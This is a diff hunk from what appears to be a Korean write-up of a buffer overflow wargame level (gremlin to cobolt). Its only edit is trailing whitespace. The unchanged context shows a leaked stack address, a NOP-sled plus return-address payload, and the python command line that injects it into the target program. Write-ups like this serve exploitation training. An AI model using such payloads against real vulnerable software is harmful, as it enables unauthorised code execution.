@@ -32,7 +32,7 @@ int main(void)
 [gremlin@localhost gremlin]$ ./Address
 0xbffffef7
 ```
-쉽게 쉘 코드를 실행할 수 있는 주소를 획득할 수 있다.
+쉽게 쉘 코드를 실행할 수 있는 주소를 획득할 수 있다.   
 payload는 NOP * 20 + \xf7\xfe\xff\xbf 이다.
 ```
 [gremlin@localhost gremlin]$ ./cobolt `python -c 'print "\x90"*20 + "\xf7\xfe\xff\xbf"'`
